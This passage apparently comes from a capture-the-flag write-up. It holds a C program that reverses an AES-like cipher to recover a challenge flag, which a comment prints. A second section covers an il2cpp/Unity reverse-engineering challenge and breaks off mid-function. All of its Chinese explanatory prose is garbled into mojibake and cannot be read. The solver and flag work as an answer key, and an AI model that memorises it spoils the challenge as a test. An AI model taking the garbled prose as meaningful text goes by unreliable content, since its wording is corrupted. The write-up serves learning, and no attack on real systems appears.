<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">InvMixRows</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token class-name">uint8_t</span> <span class="token function">xtime</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">xorKey</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span>state<span class="token punctuation">,</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">invColShift</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">invSbox</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> state<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">uint8_t</span> iv<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span>key<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">,</span>data<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>iv<span class="token punctuation">,</span>const_iv<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>const_key<span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span>const_data<span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j <span class="token operator">&lt;</span> <span class="token number">14</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token function">xorKey</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">,</span>key<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token operator">-</span>j<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token function">InvMixRows</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">invColShift</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">invSbox</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">xorKey</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">-</span>i<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token function">xorKey</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">,</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            <span class="token function">xorKey</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">,</span>iv<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span>data<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token comment">//    uint8_t test[4][4] = &#123;0&#125;;</span>
<span class="token comment">//    test[0][0] = 0xF1^0x72^0xEB^xtime(0x77^0xF1);</span>
<span class="token comment">//    test[0][1] = 0x77^0x72^0xEB^xtime(0xF1^0x72);</span>
<span class="token comment">//    test[0][2] = 0x77^0xF1^0xEB^xtime(0x72^0xEB);</span>
<span class="token comment">//    test[0][3] = 0x77^0xF1^0x72^xtime(0xEB^0x77);</span>
<span class="token comment">//    InvMixRows((uint8_t*)test);</span>


    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">xorKey</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span>state<span class="token punctuation">,</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span>key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span>i<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span>key<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">invColShift</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span>state<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">uint8_t</span> a   <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> b1  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> b2  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> c   <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">)</span>  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token operator">=</span> a<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">=</span> b1<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span>  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">=</span> b2<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span>  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">invSbox</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> state<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span>i<span class="token punctuation">)</span> <span class="token operator">=</span> rsbox<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">InvMixRows</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span>state<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token class-name">int8_t</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        a <span class="token operator">=</span> <span class="token punctuation">(</span>__int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        b <span class="token operator">=</span> <span class="token punctuation">(</span>__int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        c <span class="token operator">=</span> <span class="token punctuation">(</span>__int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        d <span class="token operator">=</span> <span class="token punctuation">(</span>__int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">)</span>     <span class="token operator">=</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">static</span> <span class="token class-name">uint8_t</span> <span class="token function">xtime</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> x<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x1b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="A-5-Second-Challenge"><a href="#A-5-Second-Challenge" class="headerlink" title="A 5 Second Challenge"></a>A 5 Second Challenge</h4><p>il2cppé€†å‘é¢˜ç›®ï¼Œæ²¡æƒ³åˆ°æˆ‘æŠ€èƒ½æ ‘ç‚¹æ­ªäº†</p>
<p>å…ˆä¸Šå›¾ï¼š<br>å¬è¯´ä½ å«æ‰«é›·çš„.jpg<br><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/YouLoser.png" alt="YouLoser"></p>
<p>å…¶å®æˆ‘ç©æ‰«é›·å¾ˆèœï¼Œä½†æ˜¯ç‚¸å¼¹ç‚¸ä¸æ­»æˆ‘ 2333<br>ä¸ºäº†ç ´è§£è¿™ä¸ªä¸œè¥¿ï¼Œæˆ‘å¹²äº†å¥½å¤šæ´»ï¼Œæœ€ç´¯çš„å…¶å®æ˜¯ç‚¹å¼€ ğŸ’£ï¼Œå†å…¶æ¬¡æ˜¯ç”»äºŒç»´ç ã€‚</p>
<p>é‚£æˆ‘ç°åœ¨ä»å¤´å¼€å§‹è®²ã€‚</p>
<p>ç”±äºå¼€å§‹æ—¶å¯¹unityçš„ä¸€äº›æ–‡ä»¶é…ç½®å®Œå…¨ä¸æ‡‚ï¼Œå¯¼è‡´æˆ‘çœ‹çš„æ™•å¤´è½¬å‘ã€‚ä¸è¿‡çœ‹äº†åˆ«äººé€†å‘çš„ä¸€äº›å®ä¾‹ï¼Œæˆ‘å¤§æ¦‚ç†è§£äº†æ–‡ä»¶ç»“æ„ã€‚é‚£æˆ‘å†™é•¿ä¸€ç‚¹ï¼Œä»å¯åŠ¨å‡½æ•°å¼€å§‹ã€‚</p>
<p>ä¼—æ‰€å‘¨çŸ¥ä¸ºäº†ç©æ¸¸æˆï¼Œç‚¹å¼€äº†æ¸¸æˆï¼Œä½†æ˜¯æ¸¸æˆ .exe é‡Œé¢å…¶å®å¹¶æ²¡æœ‰æ¸¸æˆçš„é€»è¾‘<br><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/unityMain.jpg" alt="unityMain"></p>
<p>ç›´æ¥è·³è½¬åˆ°äº† UnityMain å‡½æ•°ä¸­ï¼Œè€Œè¿™ä¸ªå‡½æ•°åœ¨åˆ«çš„ dll ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“å¼€ PE-bear å…¶å®ä¹Ÿå¯ä»¥è‡ªå·±å¯¹ç€èŠ‚åŒºå»çœ‹ï¼Œä¸è¿‡ç®—èµ·æ¥æ¯”è¾ƒå¤æ‚ï¼Œæœ‰ç°æˆçš„å·¥å…·ç”¨ä¸€ä¸‹ä¹ŸæŒºå¥½</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/UnityMain_2.jpg" alt="UnityMain_2"></p>
<p>ç„¶åæˆ‘ä»¬å°±å¼€å§‹å¯¹ UnityPlayer é‡Šæ”¾é­”æ³•ï¼ˆåŠ¨æ€è°ƒè¯•ï¼‰ï¼Œå‘ç° UnityPlayer å…¶å®æ˜¯é€šè¿‡ CreatWindowExW åˆ›å»ºå¥æŸ„ï¼Œä¼ é€’ç»™ showWindowï¼Œæœ€ç»ˆæ‰“å¼€ unity çª—å£ã€‚å…¶ä¸­ sub0x180547E70 å¯ä»¥ç§°ä¸º Load_Game_function ï¼ˆæˆ‘è‡ªå·±è¿™ä¹ˆå®šä¹‰çš„ 233 ï¼‰</p>
<p>å…¶ä¸­ sub_180088310 å‡½æ•°å¸¸ç”¨äºæ£€æµ‹æˆ–è€…åŠ è½½æ˜¯å¦åŠ è½½æˆåŠŸä¸€äº›æ–‡ä»¶ï¼Œæ¯”å¦‚ app.info , config , Play.log ç­‰æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶æ‰¾ä¸åˆ°æ¸¸æˆé€»è¾‘ï¼Œç»§ç»­è¿½è¸ªå‘ç°åœ¨</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/gameAssembly.jpg" alt="gameAssembly"></p>
<p>æ­¤å¤„åŠ è½½äº† GameAssembly.dll åŠ è½½æˆåŠŸåä¼š ç»§ç»­åŠ è½½ä¸€äº›æ–‡ä»¶æ¯”å¦‚ $(game)&#x2F;game_data&#x2F;il2cpp_data&#x2F;etc , å†åæ¥ä¹Ÿä¼šåŠ è½½ä¸€äº› creen ç›¸å…³çš„æ¨¡å— ï¼Œä¸é¡¾å“¦è¿™ä¸ªæˆ‘ä¹Ÿä¸æ‡‚ ï¼Œè¿‡äº†ä¸€æ®µå‡½æ•°ï¼Œä¼šåŠ è½½ä¸€å † dll ï¼Œæœ€åå°±æ˜¯æ‰“å¼€çª—å£ showWindow . å†è¿›ä¸€æ­¥å°±å¯ä»¥è°ƒè¯• GameAssembly.dll ç»“åˆç½‘ä¸Šæ‰€è¯´ï¼ŒGameAssembly.dll ä¸­åŒ…å«ç€æ¸¸æˆçš„é€»è¾‘ï¼Œæˆ‘å¯¹ä»–å°±æ›´åŠ æœŸå¾…äº†èµ·æ¥ã€‚</p>
<p>æ‰“å¼€ä¼šå‘ç°å¾ˆå¤šåä¸º il2cpp_XXX_XXX_XXX çš„å‡½æ•°ï¼ŒæŸ¥é˜…ä¸€äº›åˆ«äººçš„åšå®¢ï¼Œå†åŠ è‡ªå·±çš„åŠ¨æ€è°ƒè¯•ï¼ŒåŠ çœ‹ IL æºç  ï¼Œæˆ‘ä¹Ÿç¨å¾®ç†è§£äº†ä¸€äº›il2cpp_xxx å‡½æ•°çš„ä½œç”¨ ï¼Œå› ä¸ºæ˜¯ä» C# -&gt; CPP -&gt; PE ä»–é¢å‘å¯¹è±¡çš„æ–¹æ³•ï¼Œæ€æƒ³ä¹Ÿå°±å˜æˆäº† il2cpp_xxx çš„ä¸€äº›å‡½æ•°ï¼Œè€Œåœ¨ il2cpp æºç ä¸­æ¯”å¦‚è¿™ä¸€æ®µ</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// System.Boolean AFiveSecondChallenge.BombChecker::CheckIfExpired()</span>
IL2CPP_EXTERN_C IL2CPP_METHOD_ATTR <span class="token keyword">bool</span> <span class="token function">BombChecker_CheckIfExpired_m11965D79AB8C709FB9F999ACFFA108438A43652E</span> <span class="token punctuation">(</span><span class="token keyword">const</span> RuntimeMethod<span class="token operator">*</span> method<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">static</span> <span class="token keyword">bool</span> s_Il2CppMethodInitialized<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>s_Il2CppMethodInitialized<span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token function">il2cpp_codegen_initialize_method</span> <span class="token punctuation">(</span>BombChecker_CheckIfExpired_m11965D79AB8C709FB9F999ACFFA108438A43652E_MetadataUsageId<span class="token punctuation">)</span><span class="token punctuation">;</span>
		s_Il2CppMethodInitialized <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#123;</span>
		<span class="token function">IL2CPP_RUNTIME_CLASS_INIT</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int64_t</span> L_0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_StaticFields<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_static_fields_for</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get_firstQueryTime_4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>L_0<span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">goto</span> IL_001b<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#123;</span>
		<span class="token function">IL2CPP_RUNTIME_CLASS_INIT</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int64_t</span> L_1 <span class="token operator">=</span> <span class="token function">BombChecker_GetNowUnixTime_m02658B00EEC2CD986B3894FB392B39BB186716A8</span><span class="token punctuation">(</span><span class="token comment">/*hidden argument*/</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
